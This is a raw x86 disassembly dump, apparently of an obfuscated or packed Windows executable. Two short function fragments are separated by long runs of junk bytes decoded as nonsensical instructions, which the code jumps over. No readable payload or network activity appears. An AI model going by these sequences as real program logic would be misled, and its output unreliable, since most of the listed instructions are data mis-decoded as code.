  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x7ad89e60,eax
  40b6b1:	sub    cl,dl
  40b6b3:	call   0xbec4:0x92bebeb7
  40b6ba:	mov    esi,0xdb608cee
  40b6bf:	popf   
  40b6c0:	or     eax,0x5a50ebe2
  40b6c5:	push   0xb2c7345e
  40b6ca:	loopne 0x40b70f
  40b6cc:	in     eax,dx
  40b6cd:	sub    dl,BYTE PTR [edx-0x553366db]
  40b6d3:	lahf   
  40b6d4:	popa   
  40b6d5:	iret   
  40b6d6:	pop    es
  40b6d7:	and    BYTE PTR [ecx],ch
  40b6d9:	xor    eax,0x1ce8255b
  40b6de:	inc    al
  40b6e0:	ret    0xf0df
  40b6e3:	pop    edx
  40b6e4:	xor    dh,dl
  40b6e6:	push   ebp
  40b6e7:	test   eax,0x6c121172
  40b6ec:	in     al,dx
  40b6ed:	dec    edx
  40b6ee:	pop    ds
  40b6ef:	(bad)  
  40b6f0:	mov    esi,0x27561581
  40b6f5:	jno    0x40b754
  40b6f7:	jle    0x40b75d
  40b6f9:	or     eax,0x7291cb71
  40b6fe:	mov    esp,0xafb21e5b
  40b703:	scas   al,BYTE PTR es:[edi]
  40b704:	mov    ebx,0x39fff1ff
  40b709:	in     eax,dx
  40b70a:	xor    DWORD PTR [ebp+0x1905610b],esp
  40b710:	lahf   
  40b711:	add    DWORD PTR [eax-0x1d],0xc5b16a35
  40b718:	pop    ds
  40b719:	jl     0x40b751
  40b71b:	in     eax,dx
  40b71c:	dec    ebp
  40b71d:	dec    eax
  40b71e:	and    BYTE PTR [eax],al
  40b720:	pop    esi
  40b721:	mov    bh,0x57
  40b723:	pop    ecx
  40b724:	add    DWORD PTR [ebx+eiz*4+0xc],ebp
  40b728:	xor    ebx,DWORD PTR ss:[eax+0x1431f703]
  40b72f:	adc    edx,eax
  40b731:	dec    esp
  40b732:	push   ecx
  40b733:	push   ds
  40b734:	cs jg  0x40b71a
  40b737:	nop
  40b738:	xchg   ecx,eax
  40b739:	xor    dl,BYTE PTR [ecx+ebp*2]
  40b73c:	adc    edi,DWORD PTR [ecx-0x4d2773cc]
  40b742:	sbb    al,0x32
  40b744:	fst    DWORD PTR ds:0xf2b947bc
  40b74a:	jecxz  0x40b7a4
  40b74c:	dec    ebx
  40b74d:	cmp    al,0xe9
  40b74f:	fs add ch,ah
  40b752:	sbb    dl,bl
  40b754:	sub    edx,DWORD PTR [edx+0xe1fd97]
  40b75a:	sbb    DWORD PTR [ecx+0x18],esp
  40b75d:	div    ch
  40b75f:	xor    al,0x1
  40b761:	stc    
  40b762:	xor    cl,BYTE PTR [edx+edi*1]
  40b765:	fld    TBYTE PTR [esi+0x6a55d577]
  40b76b:	jnp    0x40b7b7
  40b76d:	xor    ecx,DWORD PTR [edi+0x4f]
  40b770:	retf   
  40b771:	ja     0x40b75b
  40b773:	cmc    
  40b774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b775:	sahf   
  40b776:	pushf  
  40b777:	mov    eax,ds:0x62582fac
  40b77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b77d:	cwde   
  40b77e:	ficom  WORD PTR [edi]
  40b780:	leave  
  40b781:	jne    0x40b7a9
  40b783:	fstp   TBYTE PTR ds:0xce3e2565
  40b789:	add    al,0xbd
  40b78b:	pop    ebp
  40b78c:	cmc    
  40b78d:	pop    ss
  40b78e:	mov    ds:0x1859689c,eax
  40b793:	inc    edi
  40b794:	mov    edi,0xda7c6dec
  40b799:	popf   
  40b79a:	stos   DWORD PTR es:[edi],eax
  40b79b:	data16 (bad) 
  40b79d:	outs   dx,DWORD PTR ds:[esi]
  40b79e:	push   edx
  40b79f:	or     dl,ah
  40b7a1:	daa    
  40b7a2:	pop    eax
  40b7a3:	dec    ebx
  40b7a4:	inc    edi
  40b7a5:	cmp    BYTE PTR [ebx+0x39ea8312],0x55
  40b7ac:	addr16 mov ecx,0xd4a8a73d
  40b7b2:	nop
  40b7b3:	mov    ch,0xec
  40b7b5:	inc    eax
  40b7b6:	mov    ebp,0x7202791e
  40b7bb:	push   ecx
  40b7bc:	dec    ebp
  40b7bd:	inc    esi
  40b7be:	jnp    0x40b809
  40b7c0:	inc    esp
  40b7c1:	mov    al,ds:0x7c89192f
  40b7c6:	push   edi
  40b7c7:	fidivr WORD PTR [di+0x56]
  40b7cb:	adc    BYTE PTR [ecx+edi*1+0x44],dh
  40b7cf:	mov    ebp,0x226be218
  40b7d4:	loopne 0x40b79d
  40b7d6:	fmul   QWORD PTR [ebp-0x70]
  40b7d9:	sti    
  40b7da:	xor    BYTE PTR ds:0xb8f2ff3f,al
  40b7e0:	push   ds
  40b7e1:	adc    DWORD PTR [ecx],0xa0a526f9
  40b7e7:	xchg   esp,eax
  40b7e8:	xchg   BYTE PTR [esi+0x6d],dl
  40b7eb:	mov    esi,0x65c29b4
  40b7f0:	mov    DWORD PTR [esi+0x4f],esi
  40b7f3:	jmp    0xaf35:0x77466b70
  40b7fa:	mov    ebp,0xf2575810
  40b7ff:	xchg   BYTE PTR [ebx+0x57],bh
  40b802:	inc    ebp
  40b803:	jmp    0x4a1b998b
  40b808:	mov    bh,0xaa
  40b80a:	mov    ebp,0x89f2866
  40b80f:	lods   al,BYTE PTR ds:[esi]
  40b810:	xor    dh,BYTE PTR [ebx-0x23]
  40b813:	lahf   
  40b814:	add    eax,0x4e1eb1e
  40b819:	mov    bh,0xbc
  40b81b:	out    dx,al
  40b81c:	(bad)
  40b81f:	jae    0x40b7bc
  40b821:	lea    ebx,[ebp+0x5e]
  40b824:	outs   dx,BYTE PTR ds:[esi]
  40b825:	mov    WORD PTR [ebp+0x74b75a3a],es
  40b82b:	xlat   BYTE PTR ds:[ebx]
  40b82c:	xor    BYTE PTR [edi-0x3],dl
  40b82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b830:	adc    eax,0x93830aac
  40b835:	sub    DWORD PTR [edi],eax
  40b837:	sbb    al,0xaf
  40b839:	and    al,BYTE PTR [eax+0x5898f39d]
  40b83f:	leave  
  40b840:	leave  
  40b841:	ins    DWORD PTR es:[edi],dx
  40b842:	or     eax,0xc922e99d
  40b847:	(bad)  
  40b848:	jmp    0x8caa:0x80febfbc
  40b84f:	mov    ebp,0x1b8e4c36
  40b854:	cdq    
  40b855:	sbb    ebp,DWORD PTR ds:[edi]
  40b858:	adc    al,0x99
  40b85a:	fisttp QWORD PTR [ebp-0x2f2823c5]
  40b860:	mov    ch,0x7b
  40b862:	dec    ecx
  40b863:	sbb    DWORD PTR [edi],edi
  40b865:	and    al,0xc8
  40b867:	sub    al,0x8
  40b869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b86a:	jne    0x40b839
  40b86c:	cmp    DWORD PTR [edi-0x53],esi
  40b86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b870:	enter  0x1051,0x29
  40b874:	mov    ch,0xb2
  40b876:	dec    ecx
  40b877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b878:	xchg   esp,eax
  40b879:	push   ds
  40b87a:	cmp    ah,BYTE PTR [edi-0x31]
  40b87d:	ret    0xfef7
  40b880:	push   cs
  40b881:	pop    esp
  40b882:	in     eax,dx
  40b883:	stos   BYTE PTR es:[edi],al
  40b884:	cmp    BYTE PTR [ebp+esi*8-0x28],bh
  40b888:	ins    DWORD PTR es:[edi],dx
  40b889:	adc    eax,0x32b7476c
  40b88e:	lods   al,BYTE PTR ds:[esi]
  40b88f:	ror    BYTE PTR [esi+0x22],cl
  40b892:	inc    esi
  40b893:	ret    0x2524
  40b896:	and    al,cl
  40b898:	lods   eax,DWORD PTR ds:[esi]
  40b899:	push   edi
  40b89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b89b:	and    ebp,ebp
  40b89d:	(bad)  
  40b89e:	xor    eax,0xdd78e056
  40b8a3:	scas   eax,DWORD PTR es:[edi]
  40b8a4:	in     al,dx
  40b8a5:	stos   BYTE PTR es:[edi],al
  40b8a6:	push   ss
  40b8a7:	pusha  
  40b8a8:	loop   0x40b8c4
  40b8aa:	les    edx,FWORD PTR [ebp+0x14]
  40b8ad:	mov    WORD PTR [ebx-0x6c7486e6],?
  40b8b3:	mov    edx,0xad80d16d
  40b8b8:	mov    DWORD PTR [edi],eax
  40b8ba:	cmp    BYTE PTR [ecx+0x4e],0xb6
  40b8be:	sbb    BYTE PTR [esp+eax*1],0x66
  40b8c2:	cmp    eax,edx
  40b8c4:	jo     0x40b850
  40b8c6:	lea    esi,[edi-0x69]
  40b8c9:	lods   eax,DWORD PTR ds:[esi]
  40b8ca:	addr16 mov esi,0x46eb977d
  40b8d0:	xor    DWORD PTR [edi-0x5a],esp
  40b8d3:	(bad)  
  40b8d4:	loop   0x40b8c5
  40b8d6:	pop    ss
  40b8d7:	inc    eax
  40b8d8:	mov    eax,0xe8f18f77
  40b8dd:	mov    esp,0xcf3312cb
  40b8e2:	dec    ecx
  40b8e3:	retf   
  40b8e4:	jo     0x40b8fe
  40b8e6:	fstp   TBYTE PTR ds:0x43cff133
  40b8ec:	xchg   esi,eax
  40b8ed:	stos   DWORD PTR es:[edi],eax
  40b8ee:	enter  0xf2bb,0xe6
  40b8f2:	sbb    eax,0x841b2221
  40b8f7:	scas   al,BYTE PTR es:[edi]
  40b8f8:	retf   
  40b8f9:	and    al,0x85
  40b8fb:	lods   eax,DWORD PTR ds:[esi]
  40b8fc:	pop    ss
  40b8fd:	sbb    eax,DWORD PTR [eax]
  40b8ff:	jns    0x40b8b4
  40b901:	xor    DWORD PTR [ebp+0x72af9b72],edi
  40b907:	stc    
  40b908:	and    ebp,DWORD PTR [ebx+0xa2a1527]
  40b90e:	mov    bh,0x4b
  40b910:	sbb    dl,BYTE PTR [esi+ecx*8-0x6d6b1cf6]
  40b917:	and    BYTE PTR [esi],dh
  40b919:	cwde   
  40b91a:	adc    esi,DWORD PTR [edi+ecx*2]
  40b91d:	cs icebp 
  40b91f:	scas   eax,DWORD PTR es:[edi]
  40b920:	pop    sp
  40b922:	jb     0x40b92f
  40b924:	(bad)  
  40b926:	aaa    
  40b927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b928:	addr16 mov dl,0x49
  40b92b:	jge    0x40b913
  40b92d:	push   edi
  40b92e:	fucomip st,st(3)
  40b930:	outs   dx,BYTE PTR ds:[esi]
  40b931:	pop    ss
  40b932:	adc    DWORD PTR [edi],eax
  40b934:	popf   
  40b935:	outs   dx,DWORD PTR ds:[esi]
  40b936:	push   es
  40b937:	push   ecx
  40b938:	push   ebp
  40b939:	pop    edx
  40b93a:	in     al,0xb8
  40b93c:	jne    0x40b99b
  40b93e:	out    dx,eax
  40b93f:	push   ds
  40b940:	fbld   TBYTE PTR [edx+edx*4-0x1c5e247f]
  40b947:	jne    0x40b918
  40b949:	pop    edi
  40b94a:	cmp    al,dl
  40b94c:	pop    ds
  40b94d:	stos   BYTE PTR es:[edi],al
  40b94e:	and    BYTE PTR [edx+0x45d36088],0xbb
  40b955:	add    ecx,DWORD PTR [ebx-0x39]
  40b958:	xor    esi,DWORD PTR [ecx+edx*2]
  40b95b:	cmp    BYTE PTR [esi-0x26],ah
  40b95e:	sub    al,0x62
  40b960:	mov    esp,0x50be1c12
  40b965:	sbb    eax,0x20eb25bc
  40b96a:	loopne 0x40b991
  40b96c:	mov    ecx,esi
  40b96e:	jge    0x40b946
  40b970:	enter  0x338,0xcf
  40b974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b975:	pop    ecx
  40b976:	pop    esp
  40b977:	out    0x85,al
  40b979:	scas   al,BYTE PTR es:[edi]
  40b97a:	sbb    BYTE PTR [esi-0x71c31a7d],dl
  40b980:	push   ecx
  40b981:	jae    0x40b946
  40b983:	ja     0x40b99a
  40b985:	pusha  
  40b986:	mov    bh,0x58
  40b988:	daa    
  40b989:	fwait
  40b98a:	setae  bl
  40b98d:	or     DWORD PTR [ecx-0x2d1d7bcc],ebx
  40b993:	add    eax,0xca29e82c
  40b998:	cdq    
  40b999:	jo     0x40b99e
  40b99b:	enter  0xc9b7,0xb5
  40b99f:	xor    DWORD PTR gs:[eax+0x2],ebp
  40b9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9a4:	add    eax,0x4f667d07
  40b9a9:	jno    0x40b97c
  40b9ab:	das    
  40b9ac:	adc    BYTE PTR [ecx+0x7],al
  40b9af:	push   ecx
  40b9b0:	or     al,0xab
  40b9b2:	and    BYTE PTR [eax],0x2
  40b9b5:	dec    edi
  40b9b6:	jmp    0x40b9c4
  40b9b8:	(bad)  
  40b9b9:	lds    ecx,FWORD PTR [edx+edx*4+0x549cc296]
  40b9c0:	jne    0x40b948
  40b9c2:	mov    ah,0x9f
  40b9c4:	adc    ah,BYTE PTR [ecx+0x2c490821]
  40b9ca:	mov    edx,DWORD PTR [eax-0x4b]
  40b9cd:	out    dx,al
  40b9ce:	pop    edi
  40b9cf:	sub    eax,0xe2a0ad39
  40b9d4:	sub    BYTE PTR [edx-0x51],ch
  40b9d7:	mov    al,ds:0x78524ff5
  40b9dc:	clc    
  40b9dd:	push   esp
  40b9de:	scas   al,BYTE PTR es:[edi]
  40b9df:	adc    al,0x24
  40b9e1:	inc    ebx
  40b9e2:	push   eax
  40b9e3:	popf   
  40b9e4:	push   ebx
  40b9e5:	cli    
  40b9e6:	ins    DWORD PTR es:[edi],dx
  40b9e7:	retf   
  40b9e8:	fdivrp st(7),st
  40b9ea:	mov    edi,0xcd84df3d
  40b9ef:	aas    
  40b9f0:	test   BYTE PTR [eax+ebx*4],dh
  40b9f3:	add    eax,0x728092ce
  40b9f8:	mov    cs:0x62359b0b,al
  40b9fe:	sbb    DWORD PTR [esi-0x2cbc601c],esi
  40ba04:	push   es
  40ba05:	jle    0x40b9d7
  40ba07:	xchg   ebp,eax
  40ba08:	out    dx,al
  40ba09:	ret    
  40ba0a:	sbb    esp,eax
  40ba0c:	sub    ecx,DWORD PTR [ecx+0x679a248b]
  40ba12:	fs mov esp,0xda6a4c7a
  40ba18:	add    al,0x5a
  40ba1a:	jae    0x40ba30
  40ba1c:	mov    ebp,0xbf8b1433
  40ba21:	jg     0x40ba0e
  40ba23:	(bad)  
  40ba24:	mov    ecx,0x7d8b3bf7
  40ba29:	cwde   
  40ba2a:	cmp    edx,DWORD PTR [eax]
  40ba2c:	xor    al,0xb7
  40ba2e:	imul   ebp,DWORD PTR cs:[edi-0x3f],0x6b
  40ba33:	mov    dh,0xce
  40ba35:	loopne 0x40baaa
  40ba37:	lds    ecx,FWORD PTR [ebp-0x37c7a041]
  40ba3d:	xchg   edx,eax
  40ba3e:	mov    dh,0x88
  40ba40:	sbb    eax,0xd9240b03
  40ba45:	sub    eax,ebx
  40ba47:	adc    al,dh
  40ba49:	mov    ch,0x87
  40ba4b:	jnp    0x40ba30
  40ba4d:	ficom  WORD PTR [edi]
  40ba4f:	sbb    BYTE PTR [ebx+0x8],bh
  40ba52:	sbb    esi,DWORD PTR [edx+0x14]
  40ba55:	in     eax,0x21
  40ba57:	sbb    DWORD PTR [edx],ebp
  40ba59:	loopne 0x40b9ff
  40ba5b:	pop    edx
  40ba5c:	mov    eax,0x7fc8c808
  40ba61:	xchg   edi,eax
  40ba62:	ins    DWORD PTR es:[edi],dx
  40ba63:	mov    ebx,0x4440cf86
  40ba68:	and    ecx,ebx
  40ba6a:	repz ror BYTE PTR ds:0x7adbd3a0,cl
  40ba71:	and    BYTE PTR [edx],bh
  40ba73:	js     0x40b9f6
  40ba75:	dec    DWORD PTR [ecx+0xf]
  40ba78:	nop
  40ba79:	imul   ecx,DWORD PTR [esi-0x54],0x55
  40ba7d:	js     0x40bab6
  40ba7f:	mov    eax,0x712bbbf5
  40ba84:	ins    DWORD PTR es:[edi],dx
  40ba85:	jmp    0x40bac8
  40ba87:	sub    al,BYTE PTR [ebp-0x5f25ce49]
  40ba8d:	xchg   ebp,eax
  40ba8e:	jge    0x40ba6b
  40ba90:	push   ds
  40ba91:	mov    esp,0x650ca9be
  40ba96:	popa   
  40ba97:	sar    ecx,cl
  40ba99:	imul   ebp,DWORD PTR [eax],0x2c8c932c
  40ba9f:	cs ss inc esp
  40baa2:	or     DWORD PTR [edx],ebx
  40baa4:	hlt    
  40baa5:	bound  ebp,QWORD PTR [eax-0x4c]
  40baa8:	xchg   ebx,eax
  40baa9:	mov    DWORD PTR [ebp-0x4],0x61c2
  40bab0:	mov    eax,DWORD PTR [ebp-0x4]
  40bab3:	mov    ecx,DWORD PTR [ebp-0x8]
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x422708
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x42283c
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	repnz out 0x10,eax
  40bb10:	sahf   
  40bb11:	outs   dx,BYTE PTR ds:[esi]
  40bb12:	mov    edi,0xc492bebe
  40bb17:	mov    esi,0xfe5048be
  40bb1c:	mov    ebp,DWORD PTR [ebx+eax*1-0x249c92cb]
  40bb23:	push   edx
  40bb24:	ja     0x40bb59
  40bb26:	loope  0x40baee
  40bb28:	xor    bh,BYTE PTR [edi-0x1f]
  40bb2b:	imul   esi
  40bb2d:	mov    eax,0x83e6d139
  40bb32:	inc    ebx
  40bb33:	sbb    al,0xf6
  40bb35:	push   edx
  40bb36:	imul   ebp,DWORD PTR [ebx-0x4edc0e47],0xd003ab4a
  40bb40:	pop    ecx
  40bb41:	push   es
  40bb42:	sbb    eax,0xa74aeb1b
  40bb47:	jb     0x40bba0
  40bb49:	mov    ecx,0xb4bc42d7
  40bb4e:	idiv   BYTE PTR [eax+ebx*4]
  40bb51:	sbb    ax,0xf5c
  40bb55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb56:	jg     0x40bb91
  40bb58:	mov    ebp,0xc824eef
  40bb5d:	int3   
  40bb5e:	jne    0x40bb00
  40bb60:	test   edx,eax
  40bb62:	cmp    al,BYTE PTR [edi+eax*2-0x7e]
  40bb66:	inc    ebx
  40bb67:	xor    ebp,DWORD PTR [eax]
  40bb69:	aam    0xc1
  40bb6b:	jecxz  0x40bb1e
  40bb6d:	(bad)
  40bb70:	inc    ebp
  40bb71:	fst    st(1)
  40bb73:	sar    BYTE PTR [edx-0x29],cl
  40bb76:	call   0xdba7515a
  40bb7b:	daa    
  40bb7c:	call   0x6559:0x27b7f39d
  40bb83:	call   0xf1d4:0xdca47b75
  40bb8a:	cmp    ebp,DWORD PTR [eax-0xfe6d3de]
  40bb90:	xlat   BYTE PTR ds:[ebx]
  40bb91:	cmp    DWORD PTR [edi],ecx
  40bb93:	mov    edi,DWORD PTR [esi+eiz*1-0x1d]
  40bb97:	shr    BYTE PTR gs:[edx+esi*1+0x230e11f4],cl
  40bb9f:	inc    ebp
  40bba0:	mov    bh,0xdb
  40bba2:	inc    edx
  40bba3:	imul   ecx,DWORD PTR [ebx+0x3f],0xc836c525
  40bbaa:	clc    
  40bbab:	jmp    DWORD PTR fs:[eax-0x5175d9c9]
  40bbb2:	push   ebx
  40bbb3:	call   0x7fcd:0xf503a4ec
  40bbba:	cdq    
  40bbbb:	or     al,0x6e
  40bbbd:	ins    DWORD PTR es:[edi],dx
  40bbbe:	xor    DWORD PTR [eax],ebp
  40bbc0:	(bad)  
  40bbc1:	sbb    cl,BYTE PTR [ecx+0xefe1eb4]
  40bbc7:	jg     0x40bbcb
  40bbc9:	adc    cl,bl
  40bbcb:	xor    DWORD PTR [ebp+0x2985752f],eax
  40bbd1:	push   ebx
  40bbd2:	mov    ebp,edx
  40bbd4:	cld    
  40bbd5:	mov    al,ds:0x5e60d73c
  40bbda:	addr16 inc esi
  40bbdc:	mov    ecx,0x18820a4
  40bbe1:	icebp  
  40bbe2:	sub    eax,0xf7b1986d
  40bbe7:	jl     0x40bc2f
  40bbe9:	pusha  
  40bbea:	inc    esp
  40bbeb:	test   BYTE PTR [ecx],0xb
  40bbee:	out    0xe2,eax
  40bbf0:	fsubrp st(5),st
  40bbf2:	mov    al,0x49
  40bbf4:	pop    esp
  40bbf5:	xor    dl,bh
  40bbf7:	mov    edi,0xd0e1adde
  40bbfc:	cs cmp eax,0x3356cb80
  40bc02:	repnz push edi
  40bc04:	jge    0x40bbba
  40bc06:	test   eax,0xe0a518a
  40bc0b:	cmc    
  40bc0c:	sahf   
  40bc0d:	and    bl,al
  40bc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc10:	retf   0x7f0
  40bc13:	cmp    edx,DWORD PTR [edi]
  40bc15:	nop
  40bc16:	gs fs ret 
  40bc19:	aam    0xd
  40bc1b:	inc    ebx
  40bc1c:	and    cl,BYTE PTR [ecx+ecx*8+0x64a5c1ac]
  40bc23:	mov    cl,0xb1
  40bc25:	mov    BYTE PTR [ecx-0x7db7c091],ch
  40bc2b:	jne    0x40bbf9
  40bc2d:	(bad)
  40bc30:	mov    ds,WORD PTR [edx-0x13871285]
  40bc36:	adc    DWORD PTR gs:[eax-0x25e5622],esp
  40bc3d:	sub    eax,0x6790e74f
  40bc42:	or     ecx,DWORD PTR [ebx+0x2a154a5a]
  40bc48:	jge    0x40bc11
  40bc4a:	iret   
  40bc4b:	dec    ebp
  40bc4c:	or     eax,0xa5fd05a4
  40bc51:	pop    ss
  40bc52:	in     eax,0x20
  40bc54:	test   DWORD PTR [ecx],ecx
  40bc56:	xchg   DWORD PTR [edx-0x44ddda58],edx
  40bc5c:	imul   ebx,DWORD PTR [ebp-0x199a9d94],0x17
  40bc63:	cwde   
  40bc64:	mov    bl,0x29
  40bc66:	mov    eax,ds:0xefdc724f
  40bc6b:	fsub   DWORD PTR [eax-0x4e08f30d]
  40bc71:	sbb    edi,eax
  40bc73:	sti    
  40bc74:	xchg   edx,eax
  40bc75:	shl    ebp,cl
  40bc77:	pop    edi
  40bc78:	test   DWORD PTR [edi],edx
  40bc7a:	xchg   ebx,eax
  40bc7b:	add    dh,BYTE PTR [edx-0x23]
  40bc7e:	das    
  40bc7f:	std    
  40bc80:	cs fs out dx,eax
  40bc83:	sub    BYTE PTR [esi],dh
  40bc85:	xchg   esi,eax
  40bc86:	jmp    0x40bc48
  40bc88:	and    BYTE PTR [ebp+ebp*2-0xadf41e4],ch
  40bc8f:	pushf  
  40bc90:	mov    edi,0x74f3fd51
  40bc95:	cmp    al,0x3c
  40bc97:	sahf   
  40bc98:	sbb    esp,DWORD PTR [esi+ebx*1+0x59bac08c]
  40bc9f:	fcmovnb st,st(6)
  40bca1:	cwde   
  40bca2:	lods   al,BYTE PTR ds:[esi]
  40bca3:	rcl    DWORD PTR [eax+0x58da4e9d],cl
  40bca9:	sbb    cl,BYTE PTR [esi]
  40bcab:	call   0x7cad:0x56b2e4d7
  40bcb2:	out    0xd,al
  40bcb4:	push   edx
  40bcb5:	in     al,dx
  40bcb6:	xor    ebx,ebp
  40bcb8:	cmp    DWORD PTR [ecx],ebx
  40bcba:	popf   
  40bcbb:	retf   
  40bcbc:	inc    edi
  40bcbd:	push   esp
  40bcbe:	adc    DWORD PTR [ebp+0x32564711],edi
  40bcc4:	(bad)  
  40bcc5:	fiadd  DWORD PTR [ecx+edi*8-0x1f]
  40bcc9:	imul   edx,ebp,0xffffffc3
  40bccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bccd:	mov    cs,WORD PTR [ecx-0xa62e31f]
  40bcd3:	xor    esp,ebp
  40bcd5:	js     0x40bcab
  40bcd7:	fs (bad) 
  40bcd9:	and    DWORD PTR [eax],eax
  40bcdb:	jle    0x40bca7
  40bcdd:	jge    0x40bd0d
  40bcdf:	paddsw mm3,QWORD PTR [eax]
  40bce2:	jmp    0x40bd01
  40bce4:	gs ror bh,cl
  40bce7:	inc    ebp
  40bce8:	shr    al,1
  40bcea:	ins    DWORD PTR es:[edi],dx
  40bceb:	aas    
  40bcec:	cmp    dl,BYTE PTR [ecx+eax*2-0x5c]
  40bcf0:	mov    ds:0x8f7f324d,eax
  40bcf5:	dec    ebx
  40bcf6:	inc    ecx
  40bcf7:	cdq    
  40bcf8:	pop    ds
  40bcf9:	hlt    
  40bcfa:	data16 or BYTE PTR [ecx-0x5cefb138],al
  40bd01:	push   edi
  40bd02:	fsubr  DWORD PTR [esi-0x7a96b0b8]
  40bd08:	jl     0x40bd69
  40bd0a:	cmp    esp,DWORD PTR [eax+ecx*1+0xf]
  40bd0e:	hlt    
  40bd0f:	mov    esp,0x2b4e5cc7
  40bd14:	adc    al,al
  40bd16:	ret    0xa74e
  40bd19:	retf   
  40bd1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1b:	xor    BYTE PTR [esi+0x61272bf7],0x28
  40bd22:	adc    al,0xcf
  40bd24:	sahf   
  40bd25:	jnp    0x40bd67
  40bd27:	xchg   ebp,eax
  40bd28:	(bad)  
  40bd29:	aaa    
  40bd2a:	in     eax,0xd2
  40bd2c:	(bad)  
  40bd2d:	test   eax,0x50cf67b3
  40bd32:	out    0x4e,al
  40bd34:	push   ecx
  40bd35:	xchg   esi,eax
  40bd36:	push   0xffffffbd
  40bd38:	xchg   ebp,eax
  40bd39:	mov    cl,0x91
  40bd3b:	(bad)  
  40bd3c:	iret   
  40bd3d:	aam    0x79
  40bd3f:	stos   DWORD PTR es:[edi],eax
  40bd40:	stos   DWORD PTR es:[edi],eax
  40bd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd42:	aad    0x15
  40bd44:	leave  
  40bd45:	aaa    
  40bd46:	call   0x9426:0xb32569d6
  40bd4d:	push   esp
  40bd4e:	loop   0x40bdaa
  40bd50:	gs inc ebp
  40bd52:	pop    ebx
  40bd53:	lock push esp
  40bd55:	inc    ebp
  40bd56:	int    0x35
  40bd58:	cdq    
  40bd59:	push   esi
  40bd5a:	out    dx,al
  40bd5b:	mov    bh,0xe3
  40bd5d:	daa    
  40bd5e:	daa    
  40bd5f:	(bad)  
  40bd60:	ret    
  40bd61:	fist   DWORD PTR [edi]
  40bd63:	cli    
  40bd64:	add    eax,0x6b5cfab0
  40bd69:	mov    ecx,DWORD PTR [ebx]
  40bd6b:	xchg   ecx,eax
  40bd6c:	jle    0x40bd04
  40bd6e:	and    DWORD PTR [ebx-0x11],esp
  40bd71:	adc    ebp,DWORD PTR [edx-0x21]
  40bd74:	push   ss
  40bd75:	cwde   
  40bd76:	sub    eax,0xb6c5f8d9
  40bd7b:	mov    eax,0x35c8dba3
  40bd80:	jmp    DWORD PTR [eax-0x79c8cee2]
  40bd86:	add    eax,0xec4a7363
  40bd8b:	adc    BYTE PTR [eax-0x56],dl
  40bd8e:	inc    esi
  40bd8f:	fimul  DWORD PTR [eax]
  40bd91:	jp     0x40bdb2
  40bd93:	outs   dx,BYTE PTR ds:[esi]
  40bd94:	sar    esi,0xe6
  40bd97:	add    eax,0xa479089c
  40bd9c:	pusha  
  40bd9d:	mov    eax,0xfc15f3f
  40bda2:	(bad)  
  40bda3:	stc    
  40bda4:	lahf   
  40bda5:	jno    0x40be0e
  40bda7:	sahf   
  40bda8:	push   ss
  40bda9:	fisub  DWORD PTR [edi+0x1dcae601]
  40bdaf:	int3   
  40bdb0:	inc    edi
  40bdb1:	(bad)  
  40bdb3:	mov    dl,0x64
  40bdb5:	adc    DWORD PTR [eax+0x5f25e157],0xc1df37b1
  40bdbf:	shr    BYTE PTR [ebp+0xc],cl
  40bdc2:	aad    0x8c
  40bdc4:	pop    es
  40bdc5:	(bad)  
  40bdc8:	push   esp
  40bdc9:	sbb    edx,DWORD PTR [ecx-0x3af4cdd7]
  40bdcf:	stos   DWORD PTR es:[edi],eax
  40bdd0:	cdq    
  40bdd1:	clc    
  40bdd2:	jmp    0x3ea5:0xaa86366d
  40bdd9:	jg     0x40bde6
  40bddb:	cmp    ebx,DWORD PTR [edi]
  40bddd:	les    edx,FWORD PTR [ebx+0x12]
  40bde0:	test   eax,0x29b06501
  40bde5:	and    bh,cl
  40bde7:	(bad)  
  40bde8:	loopne 0x40be0c
  40bdea:	clc    
  40bdeb:	dec    esp
  40bdec:	rcr    DWORD PTR [eax+0x65ed1cfc],1
  40bdf2:	rcl    BYTE PTR [esi+0x5fb9c018],1
